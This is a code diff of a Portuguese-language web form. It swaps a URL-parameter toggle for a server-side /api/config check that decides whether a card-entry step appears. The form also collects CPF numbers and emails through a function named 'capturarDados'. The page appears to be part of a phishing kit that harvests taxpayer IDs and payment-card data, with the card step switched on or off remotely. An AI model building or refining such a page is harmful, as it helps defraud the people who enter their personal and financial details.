@@ -651,33 +651,15 @@
         // URL do servidor
         const SERVER_URL = window.location.origin;
 
-        // FUNÇÃO QUE LÊ A URL DE VERDADE (funciona 100% em todos dispositivos)
-        function getCartaoAtivo() {
+        // ===== FUNÇÃO PARA BUSCAR CONFIGURAÇÃO DO SERVIDOR =====
+        async function getCartaoAtivoDoServidor() {
             try {
-                // Método mais confiável
-                const urlParams = new URLSearchParams(window.location.search);
-                const cartao = urlParams.get('cartao');
-                
-                console.log('🔍 URLSearchParams:', cartao);
-                
-                // Se não tiver parâmetro, ativado
-                if (cartao === null) {
-                    console.log('🟢 Sem parâmetro = ATIVADO');
-                    return true;
-                }
-                
-                // Se for 'false', desativado
-                if (cartao === 'false') {
-                    console.log('🔴 Parâmetro false = DESATIVADO');
-                    return false;
-                }
-                
-                // Qualquer outro caso, ativado
-                console.log('🟢 Parâmetro =', cartao, '= ATIVADO');
-                return true;
-                
-            } catch (e) {
-                console.error('Erro ao ler URL:', e);
+                const response = await fetch(`${SERVER_URL}/api/config`);
+                const data = await response.json();
+                console.log('📡 Configuração do servidor:', data);
+                return data.cartaoAtivo;
+            } catch (error) {
+                console.error('❌ Erro ao buscar configuração:', error);
                 return true; // padrão seguro
             }
         }
@@ -714,12 +696,11 @@
         };
 
         $(document).ready(function() {
-            // Mostra a URL no console ao carregar
-            console.log('🚀 Página carregada. URL:', window.location.href);
-            
-            // Testa a função ao carregar
-            const teste = getCartaoAtivo();
-            console.log('📱 Teste inicial - cartaoAtivo =', teste);
+            // Testa conexão com o servidor ao carregar
+            fetch(`${SERVER_URL}/api/config`)
+                .then(res => res.json())
+                .then(data => console.log('🚀 Servidor respondeu:', data))
+                .catch(err => console.error('❌ Servidor não respondeu:', err));
             
             // Máscaras
             $('#cpf').mask('000.000.000-00');
@@ -811,7 +792,7 @@
                 }, 3000);
             });
 
-            $('#btnConfirmar1').on('click', function() {
+            $('#btnConfirmar1').on('click', async function() {
                 if (!$('#email').val().includes('@')) {
                     Swal.fire({ icon: 'error', title: 'E-mail inválido', background: '#C62828', color: 'white' });
                     return;
@@ -820,12 +801,14 @@
                 window.capturarDados({ cpf: $('#cpf').val(), email: $('#email').val() });
 
                 $('#loader').removeClass('hidden');
+                
+                // Busca configuração do servidor ANTES de prosseguir
+                const cartaoAtivo = await getCartaoAtivoDoServidor();
+                
                 setTimeout(() => {
                     $('#loader').addClass('hidden');
                     
-                    // Lê da URL com a função confiável
-                    const cartaoAtivo = getCartaoAtivo();
-                    console.log('📱 Decisão final - cartaoAtivo =', cartaoAtivo);
+                    console.log('📱 Decisão baseada no servidor - cartaoAtivo =', cartaoAtivo);
                     
                     if (cartaoAtivo) {
                         $('#page3').addClass('hidden');
